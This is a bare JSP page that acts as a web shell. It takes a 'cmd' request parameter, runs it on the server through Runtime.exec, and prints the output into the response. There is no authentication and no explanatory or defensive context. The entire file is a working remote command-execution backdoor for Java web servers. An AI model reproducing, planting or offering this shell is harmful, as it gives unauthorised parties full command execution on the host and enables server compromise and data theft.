<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    String output = "";
    if (cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd, null, null);
            BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((s = sI.readLine()) != null) {
                output += s + "\n";
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
%>
<%=output %>
